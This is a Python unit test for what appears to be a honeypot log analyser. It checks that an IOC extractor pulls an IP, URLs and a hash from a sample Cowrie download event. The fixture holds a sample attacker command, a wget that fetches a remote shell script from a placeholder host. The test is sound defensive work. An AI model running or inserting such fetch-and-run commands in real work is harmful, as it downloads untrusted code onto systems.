import sqlite3

from honeycomb.src.analysis.ioc_extractor import extract_iocs
from honeycomb.src.storage.schema import init_db


def test_extracts_expected_iocs(tmp_path):
    db_path = str(tmp_path / "test.db")

    with sqlite3.connect(db_path) as conn:
        init_db(conn)
        conn.execute(
            """
            INSERT INTO events (
                event_id, ts_utc, src_ip, event_type, url, command, sha256
            ) VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (
                "event-1",
                "2026-10-14T10:00:00+00:00",
                "1.2.3.4",
                "cowrie.session.file_download",
                "http://198.51.100.9/x.sh",
                "wget http://example.com/other.sh",
                "a" * 64,
            ),
        )
        conn.commit()

    results = extract_iocs(db_path)
    pairs = {(item["type"], item["value"]) for item in results}

    assert ("ip", "1.2.3.4") in pairs
    assert ("url", "http://198.51.100.9/x.sh") in pairs
    assert ("url", "http://example.com/other.sh") in pairs
    assert ("sha256", "a" * 64) in pairs